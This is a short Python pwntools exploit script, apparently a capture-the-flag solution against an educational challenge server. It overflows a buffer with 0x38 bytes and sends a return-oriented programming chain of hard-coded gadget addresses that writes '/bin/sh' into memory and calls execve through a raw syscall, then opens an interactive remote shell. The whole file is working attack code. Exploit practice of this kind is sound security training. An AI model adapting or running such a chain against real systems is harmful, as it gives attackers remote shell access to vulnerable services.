#!/usr/bin/env python

from pwn import *

#r = process('./rop-2de8166134d2df0695697b043511d4d0')
r = remote('edu-ctf.csie.org', 10173)
r.recvuntil(':D\n')

pop_rdi = 0x0000000000400686
space = 0x006b6000

pop_rsi = 0x00000000004100f3
mov_rdi_rsi = 0x000000000044709b
pop_rdx_rsi = 0x000000000044beb9
pop_rax = 0x0000000000415714
syscall = 0x000000000040125c

payload = p64( pop_rdi )
payload += p64( space )
payload += p64( pop_rsi )
payload += "/bin/sh\00"
payload += p64( mov_rdi_rsi )
payload += p64( pop_rdx_rsi )
payload += p64( 0 )
payload += p64( 0 )
payload += p64( pop_rax )
payload += p64( 0x3b )
payload += p64( syscall )

r.sendline( 'A' * 0x38 +  payload )
r.interactive()
